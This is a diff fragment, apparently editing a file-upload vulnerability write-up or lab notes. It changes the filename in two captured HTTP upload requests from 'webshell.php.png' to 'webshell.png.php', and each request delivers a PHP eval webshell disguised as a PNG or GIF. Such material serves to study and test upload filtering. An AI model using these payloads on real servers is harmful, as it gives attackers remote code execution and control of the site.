@@ -213,7 +213,7 @@ Cookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn
 Connection: close
 
 ------WebKitFormBoundary8sP27qQBgBO4GBPd
-Content-Disposition: form-data; name="file"; filename="webshell.php.png"
+Content-Disposition: form-data; name="file"; filename="webshell.png.php"
 Content-Type: image/png
 
 <?php @eval($_POST['shell']) ?>
@@ -252,7 +252,7 @@ Cookie: PHPSESSID=tpvhqhfhbehp1sg4tk0od9s2pn
 Connection: close
 
 ------WebKitFormBoundaryjq6FmbKJJ3r1PCcW
-Content-Disposition: form-data; name="file"; filename="webshell.php.png"
+Content-Disposition: form-data; name="file"; filename="webshell.png.php"
 Content-Type: image/png
 
 GIF8<?php @eval($_POST['shell']) ?>
